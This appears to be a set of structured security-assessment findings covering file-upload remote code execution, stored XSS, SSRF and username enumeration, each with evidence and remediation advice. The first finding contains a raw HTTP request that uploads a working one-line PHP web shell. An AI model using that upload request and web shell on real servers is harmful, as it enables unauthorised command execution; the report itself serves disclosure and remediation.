title: Unauthenticated remote code execution in file upload handler
description: The file upload handler stores uploaded files under the web root without validating the extension, allowing an unauthenticated attacker to upload and execute a PHP web shell.

evidence.raw_request:
POST /upload HTTP/1.1
Host: app.example.test
Content-Type: multipart/form-data; boundary=x

--x
Content-Disposition: form-data; name="file"; filename="shell.php"

<?php system($_GET['cmd']); ?>
--x--
evidence.explanation: A PHP web shell was uploaded and executed, returning the output of the id command as the www-data user.

remediation: Validate and allow-list upload extensions, store uploads outside the web root, and serve them through a handler that never executes them.

title: Stored cross-site scripting in profile display name
description: The profile display name is rendered without output encoding, allowing a stored XSS payload that executes for anyone who views the profile.

evidence.explanation: The payload stored in the display name was reflected without encoding and executed in the victim's browser. A later re-test confirmed the vendor fix encodes the field.

remediation: HTML-encode user-controlled output and apply a context-aware templating auto-escape.

title: Server-side request forgery in URL preview feature
description: The URL preview feature fetches arbitrary user-supplied URLs server-side, which may allow access to internal services. Reaching cloud metadata was attempted but not proven.

evidence.explanation: The preview endpoint fetched an attacker-controlled host, but access to an internal target was not demonstrated.

remediation: Resolve and allow-list outbound hosts, block RFC 1918 and link-local ranges, and disable redirects.

title: Verbose authentication error enables username enumeration
mitre_attack_name: Gather Victim Identity Information: Email Addresses
description: The login endpoint returns a different message for unknown users versus wrong passwords, allowing username enumeration.

evidence.explanation: Two distinct error messages let an attacker tell valid accounts apart. The report records only the bare path for this finding.

remediation: Return a single generic authentication failure message regardless of which credential was wrong.
